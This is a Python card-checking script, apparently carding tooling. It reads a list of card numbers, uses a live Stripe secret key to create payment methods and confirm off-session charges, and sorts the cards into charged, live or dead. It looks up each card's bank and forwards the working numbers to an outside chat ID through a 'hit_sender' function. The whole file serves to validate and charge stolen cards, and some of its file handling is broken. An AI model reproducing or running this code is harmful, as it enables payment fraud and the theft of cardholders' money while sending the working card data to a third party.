import requests
from extra import *
from termcolor import colored
import time
import json
import linecache
import os, random, pyfiglet

red = '\033[91m'  # merah
green = '\033[92m'  # hijau
cyan = '\033[96m'  # cyan
blank = '\033[0m'  # reset

FONTS = 'basic', 'o8', 'doom'
font = random.choice(FONTS)

print(os.linesep)
print(green + pyfiglet.figlet_format('STRIPE   CC   CHECKER', font=font, justify='center', width=os.get_terminal_size().columns), end='' + blank)

def found(name_file):
    return len(linecache.getlines(name_file))

inputs = input('File Path (D:\Stripe-CC-Checker\cc.txt, sdcard/Stripe-CC-Checker/cc.txt, cc.txt)\nEnter File Path : ')
# inputs = 'E:\\Stripe-CC-Checker\\cc.txt' 
sk = input('Sk Live : ')
# sk = ''
amt = input('Amount (1*100) Ex 100 : ')
# amt = '100'
currency = input('Currency (usd, eur, etc...) : ')
# currency = 'usd'

tyty = found(inputs)
print(f'\nFound CC from file : {tyty}\n')
print('loading....')

if int(amt) < 100:
    print('Amount must be *100 of the total amount\nIf your amount is $1 then put 100')
    exit()
if 'txt' not in inputs:
    file_open = inputs+'.txt'
else:
    file_open = inputs





with open(file_open,'r') as file:
    cards = file.read().split('\n')
    for card in cards:
     try:
        lista = card.split('|')
        ccnumb = lista[0][:6]
        binlook = requests.get(f"https://lookup.binlist.net/{ccnumb}").json()
        bank = binlook.get('bank', {}).get('name', '-')
        country = binlook.get('country', {}).get('name', '-')
        type = binlook.get('type', '-')
        start_time = time.time()
        id = ''
        while True:
            r1 = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                'type=card&card[number]='+lista[0]+'&card[exp_month]='+lista[1]+'&card[exp_year]='+lista[2],
                headers = {'Authorization': 'Bearer ' + sk}
            )       
            if 'rate_limit' in r1.text:
                continue 
            if 'pm' not in r1.text:
                end_time = time.time()
                total_time = end_time - start_time
                print(colored('\n[ ! ] # DEAD CC : '+card+' - '+bank+' - '+type+' card\n[ ! ] Country : '+country+'\n[ ! ] Result : '+json.loads(r1.text)['error']['message']+'\n[ ! ] Time : '+str(total_time) + ' Seconds', 'red'))
                break
                continue
            if 'pm' in r1.text:
                id = json.loads(r1.text)['id']
            break
        while True:
            r2 = requests.post(
                'https://api.stripe.com/v1/payment_intents',
                'amount='+amt+'&currency='+currency+'&payment_method_types[]=card&description=@mza_xxdv Donation&payment_method='+id+'&confirm=true&off_session=true',
                 headers = {'Authorization': 'Bearer ' + sk}
                )
            if 'rate_limit' in r2.text:
                continue
            end_time = time.time()
            total_time = end_time - start_time
            if 'succeeded' in r2.text or 'Payment complete' in r2.text or '"cvc_check": "pass"' in r2.text:
                output = '\n[ + ] #HITS CC : '+card+' - '+bank+' - '+type+' card\n[ ! ] Country : '+country+'\n[ + ] Result : CCN Charged ✅\n[ + ] Time : '+str(total_time) + ' Seconds' 
                print(colored(output, 'green'))
                hit_sender(card, output, '1945035723') #ganti sesuai selera
                with open('HITS.txt','r') as file:
                    file.write(card+'\n')
                    file.close()
                break
                continue    
            elif 'insufficient_funds' in r2.text or 'incorrect_cvc' in r2.text or 'invalid_account' in r2.text or 'transaction_not_allowed' in r2.text or 'authentication_required' in r2.text:
                output = '\n[ + ] #LIVE CC : '+card+' - '+bank+' - '+type+' card\n[ ! ] Country : '+country+'\n[ + ] Result : '+json.loads(r2.text)['error']['message']+' ✅\n[ + ] Time : '+str(total_time) + ' Seconds'  
                print(colored(output, 'green'))
                hit_sender(card, output, '1945035723') #ganti sesuai selera
                with open('LIVE.txt','r') as file:
                    file.write(card+'\n')
                    file.close() 
                break
                continue       
            else:
                output = '\n[ ! ] #DEAD CC : '+card+' - '+bank+' - '+type+' card\n[ ! ] Country : '+country+'\n[ ! ] Result : '+json.loads(r2.text)['error']['message']+'\n[ ! ] Time : '+str(total_time) + ' Seconds'      
                print(colored(output, 'red'))  
                break
                continue     
     except Exception:
        pass
    
print('\nDone')